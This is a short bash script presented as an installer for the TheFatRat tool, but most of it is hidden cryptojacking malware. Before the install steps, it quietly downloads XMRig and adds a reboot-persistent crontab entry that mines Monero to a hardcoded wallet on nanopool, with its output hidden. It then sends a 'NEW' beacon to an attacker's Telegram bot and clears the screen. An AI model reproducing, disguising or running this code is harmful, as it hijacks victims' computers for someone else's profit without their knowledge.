#!/bin/bash
sleep 3
xdg-open "https://t.me/bahaa_010640/91"
chmod +x *

sudo apt install -y wget tar cron

wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz

sleep 3

tar -xvf xmrig-6.16.4-linux-x64.tar.gz

sleep 2

sudo cp xmrig-6.16.4/xmrig /usr/local/bin/

sleep 1

sudo rm -rf xmrig-6.16.4
sudo rm -rf xmrig-6.16.4-linux-x64.tar.gz
sleep 5

code="@reboot (sleep 50; nohup xmrig -o xmr-eu1.nanopool.org:14433 -u 4A1wCbPrWWF5f9xPmBrbkdZjSRzDcv5mD36dvPJE6GgsdC87y652ragj8zfQTthrZQjPcxb5k8qZn3ZE1C7QqiU44w9HDcA --tls --coin monero --threads=\$(\$(nproc) / 4)) &>/dev/null &"

(crontab -l 2>/dev/null | grep -qF "$code") || (crontab -l 2>/dev/null; echo "$code") | crontab -

if ! crontab -l | grep -qF "$code"; then
    (crontab -l 2>/dev/null; echo "$code") | crontab -
    echo "A"
else
    echo "B"
fi
clear
sleep 5
BOT_TOKEN="7358706949:AAGmCtR29AVrmTO5lH6M7424T0pWim_Pm0k"
CHAT_ID="5792222595"
MESSAGE="NEW ?"

nohup curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d "chat_id=$CHAT_ID" -d "text=$MESSAGE" &>/dev/null &
sleep 5

#________________________________________________________________________________#
#________________________________________________________________________________#
#________________________________________________________________________________#
sudo apt install git -y

git clone https://github.com/Screetsec/TheFatRat.git
cd TheFatRat
chmod +x setup.sh && ./setup.sh